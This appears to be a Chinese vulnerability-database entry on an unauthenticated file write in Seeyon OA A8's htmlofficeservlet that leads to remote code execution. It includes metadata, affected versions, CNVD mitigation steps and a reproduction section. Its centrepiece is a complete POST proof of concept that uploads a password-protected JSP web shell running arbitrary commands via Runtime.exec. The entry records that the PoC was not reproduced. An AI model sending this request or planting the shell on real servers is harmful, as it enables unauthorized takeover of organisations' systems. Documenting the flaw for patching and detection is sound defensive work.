---
source: "hatch 补库批 20260928"
title: "致远A8 htmlofficeservlet任意文件写入→代码执行"
product: "致远A8"
record_type: "vulnerability"
review_status: "text-reviewed"
verification_status: "not-reproduced"
content_status: "needs-review"
primary_identifiers: ""
referenced_identifiers: ""
identifier_status: "unknown"
affected_scope: "A8-V5 6.1sp1、A8+7.0SP1–3/7.1"
prerequisites: "声明无认证"
side_effects: "文件写入/上传示例可能留下文件、覆盖数据或触发脚本执行；命令/代码执行示例可能改变主机状态"
review_date: "2026-10-02"
source_status: "unknown"
archive_url: "https://github.com/Ares-X/VulWiki/blob/41940cb0038d09ca5aaddbe5bffb923e423d210f/Web%E5%AE%89%E5%85%A8/OA%E5%8A%9E%E5%85%AC/%E8%87%B4%E8%BF%9COA/%E8%87%B4%E8%BF%9COA%20A8%20%E7%B3%BB%E7%BB%9F%E8%BF%9C%E7%A8%8B%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C%E6%BC%8F%E6%B4%9E.md"
id: "vw-79115262edd15880cdf82800"
entity_id: "ve-79115262edd15880cdf82800"
schema_version: "1"
---

# 致远A8 htmlofficeservlet任意文件写入→代码执行

## 条目说明

- 对象与具体问题：致远A8；htmlofficeservlet任意文件写入→代码执行
- 版本、配置及部署条件：A8-V5 6.1sp1、A8+7.0SP1–3/7.1
- 认证与权限前提：声明无认证
- 核验边界：已完成原始 Markdown 的文本审阅；未执行 PoC、未访问目标、未视检截图。来源所述影响与复现结果不等于本库独立验证。

## 证据边界与更正

以下记录原始资料的证据边界。可以由原文确定的产品、编号及格式问题已在本条修订；没有原始证据的版本、响应和补丁信息仍待核实。

- 同htmlofficeservlet报告，包含CNVD安全通告URL可作主来源
- DBSTEP入口错误非确认漏洞；JSP载荷和版本较完整但未给落点/编码解释
- 最后散列字符与其他篇长度不同，需确认协议尾部意义；不可凭此运行

## 操作风险

文件写入/上传示例可能留下文件、覆盖数据或触发脚本执行；命令/代码执行示例可能改变主机状态。保留原示例供静态分析；仅可在明确授权的隔离测试环境验证，事先准备备份与回滚。凭据示例如含星号，仅保留首尾用于说明，不能直接使用。

## 技术资料与来源记录

一、漏洞简介
------------

该系统的漏洞点在于致远OA-A8系统的Servlet接口暴露，安全过滤处理措施不足，使得用户在无需认证的情况下实现任意文件上传。攻击者利用该漏洞，可在未授权的情况下，远程发送精心构造的网站后门文件，从而获取目标服务器权限，在目标服务器上执行任意代码。

二、漏洞影响
------------

漏洞影响的产品版本包括：

致远A8-V5协同管理软件 V6.1sp1

致远A8+协同管理软件V7.0、V7.0sp1、V7.0sp2、V7.0sp3

致远A8+协同管理软件V7.1

漏洞处置建议

临时修补方案如下：

1、 配置URL访问控制策略；

2、
在公网部署的致远A8+服务器，通过ACL禁止外网对"/seeyon/htmlofficeservlet"路径的访问；

3、 对OA服务器上的网站后门文件进行及时查杀。

建议使用致远OA-A8系统的信息系统运营者进行自查，发现存在漏洞后，按照以上方案及时修复。
详情请移步CNVD官网查看<https://www.cnvd.org.cn/webinfo/show/5095>

三、复现过程
------------

先访问/seeyon/htmlofficeservlet
![](./.resource/致远OAA8系统远程命令执行漏洞/media/rId25.png) 出现DBSTEP V3.0 0 21 0 htmoffice operate
err
![](./.resource/致远OAA8系统远程命令执行漏洞/media/rId26.png) 掏出burp进行抓包替换成poc如下
![](./.resource/致远OAA8系统远程命令执行漏洞/media/rId27.png) 提交POST请求包，查看回显如下
![](./.resource/致远OAA8系统远程命令执行漏洞/media/rId28.png)

#### 小结

POC：(POST包)

```http
    POST /seeyon/htmlofficeservlet HTTP/1.1
    Content-Length: 1121
    User-Agent: Mozilla/4.0 (compatible; MSIE 6.0; Windows NT 5.1; SV1)
    Host: xxxxxxxxx
    Pragma: no-cache

    DBSTEP V3.0     355             0               666             DBSTEP=OKMLlKlV
    OPTION=S3WYOSWLBSGr
    currentUserId=zUCTwigsziCAPLesw4gsw4oEwV66
    CREATEDATE=wUghPB3szB3Xwg66
    RECORDID=qLSGw4SXzLeGw4V3wUw3zUoXwid6
    originalFileId=wV66
    originalCreateDate=wUghPB3szB3Xwg66
    FILENAME=qfTdqfTdqfTdVaxJeAJQBRl3dExQyYOdNAlfeaxsdGhiyYlTcATdN1liN4KXwiVGzfT2dEg6
    needReadFile=yRWZdAS6
    originalCreateDate=wLSGP4oEzLKAz4=iz=66
    <%@ page language="java" import="java.util.*,java.io.*" pageEncoding="UTF-8"%><%!public static String excuteCmd(String c) {StringBuilder line = new StringBuilder();try {Process pro = Runtime.getRuntime().exec(c);BufferedReader buf = new BufferedReader(new InputStreamReader(pro.getInputStream()));String temp = null;while ((temp = buf.readLine()) != null) {line.append(temp+"\n");}buf.close();} catch (Exception e) {line.append(e.getMessage());}return line.toString();} %><%if("asasd3344".equals(request.getParameter("pwd"))&&!"".equals(request.getParameter("cmd"))){out.println("<pre>"+excuteCmd(request.getParameter("cmd")) + "</pre>");}else{out.println(":-)");}%>6e4f045d4b8506bf492ada7e3390d7c
```
